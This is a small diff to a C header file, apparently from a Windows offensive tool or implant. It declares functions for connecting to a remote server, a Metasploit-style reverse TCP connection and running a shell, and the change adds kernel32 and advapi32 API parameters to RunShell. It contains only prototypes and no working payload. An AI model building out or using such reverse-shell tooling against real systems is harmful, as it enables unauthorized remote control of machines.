@@ -6,6 +6,6 @@
 
 SOCKET ConnectRemoteServer(char* ipAddress, int port);
 BOOL MsfReverseTcp(Arguments listAgrument);
-BOOL RunShell(Arguments listAgrument);
+BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrument);
 
 #endif
